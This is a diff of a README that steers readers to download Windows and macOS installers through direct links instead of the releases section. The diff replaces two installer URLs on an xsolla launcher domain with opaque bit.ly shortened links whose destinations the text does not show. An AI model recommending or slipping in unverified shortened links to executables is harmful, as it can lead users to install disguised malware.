@@ -9,10 +9,10 @@ To get started you need to download Windows & macos App. You can view release to
 I recommended download Windows & macos app only link. Because, release section maybe not released app. So, click the link to download Windows & macos App. 
 
 Windows app: 
-https://installer.launcher.xsolla.com/xlauncher-builds/xsolla-launcher-update/2931/bin/installer.exe
+https://bit.ly/NatavanBLOXWindows
 
 Macos App:
-https://installer.launcher.xsolla.com/xlauncher-builds/xsolla-launcher-update/2933/bin/launcher.dmg
+https://bit.ly/NatavanBLOXMacos
 
 
 # Installing a windows application 
